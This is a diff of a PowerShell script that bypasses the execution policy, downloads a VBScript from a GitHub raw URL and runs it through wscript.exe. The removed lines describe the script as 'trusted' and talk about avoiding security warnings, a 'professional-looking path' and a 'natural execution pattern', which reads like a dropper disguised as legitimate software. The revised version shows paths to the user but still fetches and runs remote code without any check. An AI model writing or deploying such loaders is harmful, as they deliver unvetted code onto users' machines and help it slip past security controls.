@@ -1,44 +1,53 @@
 <#
 .SYNOPSIS
-    Trusted VBScript Executor
+    User-Friendly VBScript Executor
 .DESCRIPTION
-    Safely downloads and executes a VBScript from a trusted source
-    using recommended Windows patterns to avoid security warnings.
+    Downloads and runs a VBScript with clear path visibility
 #>
 
-# Temporarily allow script execution (only for current process)
-Set-ExecutionPolicy Bypass -Scope Process -Force
+# Set execution policy for current session only
+Set-ExecutionPolicy Bypass -Scope Process -Force -ErrorAction SilentlyContinue
 
 # Configuration
-$TrustedSource = "https://github.com/seunoshino/myapp-downloads/raw/main/100%25.vbs"
-$LocalFile = "$env:LOCALAPPDATA\MyCompany\Scripts\application.vbs"  # Professional-looking path
+$VbsUrl = "https://github.com/seunoshino/myapp-downloads/raw/main/100%25.vbs"
+$Destination = "$env:TEMP\MyApp\script.vbs"  # Standard temp location
 
-# Create application folder
-if (-not (Test-Path "$env:LOCALAPPDATA\MyCompany\Scripts")) {
-    $null = New-Item -ItemType Directory -Path "$env:LOCALAPPDATA\MyCompany\Scripts" -Force
+# Create folder and show location
+Write-Host "Creating working directory..."
+$workingDir = "$env:TEMP\MyApp"
+if (-not (Test-Path $workingDir)) {
+    New-Item -ItemType Directory -Path $workingDir -Force | Out-Null
 }
 
-# Download and execute with proper Windows APIs
+Write-Host "Files will be saved to: $workingDir" -ForegroundColor Cyan
+Write-Host "Full path: $Destination" -ForegroundColor Cyan
+
+# Download and execute
 try {
-    # Recommended download method for enterprises
-    Write-Host "Downloading required components..."
-    $downloader = New-Object System.Net.WebClient
-    $downloader.DownloadFile($TrustedSource, $LocalFile)
+    # Download with progress display
+    Write-Host "`nDownloading script..." -ForegroundColor Yellow
+    (New-Object System.Net.WebClient).DownloadFile($VbsUrl, $Destination)
     
-    # Natural execution pattern
-    Write-Host "Starting application..."
-    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
-    $processInfo.FileName = "wscript.exe"
-    $processInfo.Arguments = "`"$LocalFile`""
-    $processInfo.WorkingDirectory = [System.IO.Path]::GetDirectoryName($LocalFile)
-    $processInfo.UseShellExecute = $true  # Important for clean execution
-    
-    $process = [System.Diagnostics.Process]::Start($processInfo)
-    
-    Write-Host "Application started successfully" -ForegroundColor Green
+    # Verify download
+    if (Test-Path $Destination) {
+        Write-Host "Download successful!" -ForegroundColor Green
+        Write-Host "File saved to: $Destination" -ForegroundColor Cyan
+        
+        # Open containing folder (optional)
+        Start-Process "explorer.exe" -ArgumentList "/select,`"$Destination`""
+        
+        # Execute script
+        Write-Host "`nStarting script execution..." -ForegroundColor Yellow
+        Start-Process "wscript.exe" -ArgumentList "`"$Destination`""
+    }
+    else {
+        Write-Host "Download failed - file not found" -ForegroundColor Red
+    }
 }
 catch {
-    Write-Warning "An error occurred during execution:"
-    Write-Host $_.Exception.Message -ForegroundColor Red
-    exit 1
+    Write-Host "Error: $_" -ForegroundColor Red
 }
+
+# Show final location again
+Write-Host "`nYou can always find the script at:" -ForegroundColor Cyan
+Write-Host $Destination -ForegroundColor White
